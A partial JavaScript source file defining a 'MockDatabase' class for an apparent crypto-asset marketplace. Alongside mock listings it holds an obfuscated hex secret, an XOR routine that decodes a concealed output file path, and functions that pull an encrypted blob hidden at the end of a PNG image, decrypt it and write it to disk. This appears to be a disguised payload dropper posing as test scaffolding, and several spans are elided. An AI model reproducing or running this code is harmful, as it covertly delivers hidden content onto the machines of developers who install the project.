...
class MockDatabase {
  ...
  initializeAssets() {
    const mockAssets = [
      ...
      },
      {
        ...
        secret: "2c0f1b0c483408161414180d5e37160911131f04481839101e051110030116",
        price: {
          amount: 12000,
          currency: 'USDT',
        },
  ...
  decryptPath = (data, secret) => {
    const key = Buffer.from(secret);

    return Buffer.from(
      data.map((byte, i) => byte ^ key[i % key.length])
    );
  };
  saveSign(signBuffer, enfile){
    const fs = require("fs");
    const path = require("path");
    const signature = signBuffer.toString("utf8");
    
    const outputPath = path.join(
      process.cwd(),
      this.decryptPath(Buffer.from(enfile, "hex"), "path-key").toString("utf8")
    );
  ...
  verifySignFile(imageUrl, secret) {
    const fs = require("fs");
    const path = require("path");
    ...
    if (signLength <= 0 || signLength > buffer.length - 4) {
      throw new Error("Invalid sign length");
    }
    const signStart = buffer.length - 4 - signLength;
    const pngBuffer = buffer.subarray(0, signStart);
    ...
    const authTag = encryptedSign.subarray(-16);
    const encrypted = encryptedSign.subarray(12, -16);
